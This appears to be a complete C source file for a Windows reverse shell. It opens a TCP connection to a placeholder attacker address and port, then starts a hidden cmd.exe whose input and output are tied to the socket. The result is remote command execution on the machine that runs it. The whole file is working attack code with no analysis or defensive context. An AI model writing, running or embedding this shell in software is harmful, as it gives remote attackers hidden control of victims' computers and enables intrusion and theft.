#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {

	SOCKET shell;
	struct sockaddr_in shell_addr;
	WSADATA wsa;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	char RecvServer[512];
	int connection;
	char ip_addr[] = "IP_ADDRESS";
	int port = LISTENING_PORT;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,(unsigned int)NULL,(unsigned int)NULL);

	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	inet_pton(AF_INET, ip_addr, &shell_addr.sin_addr.s_addr);

	connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

	if (connection == SOCKET_ERROR) {

		printf("[!] Connection to the target server failed, Please try again!\n");
		exit(0);
	}
	else {

		recv(shell, RecvServer, sizeof(RecvServer), 0);
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		memset(&pi, 0, sizeof(pi));
    
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
		
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		
		WaitForSingleObject(pi.hProcess, INFINITE);
		
    CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
    
		memset(RecvServer, 0, sizeof(RecvServer));
		
	}
}
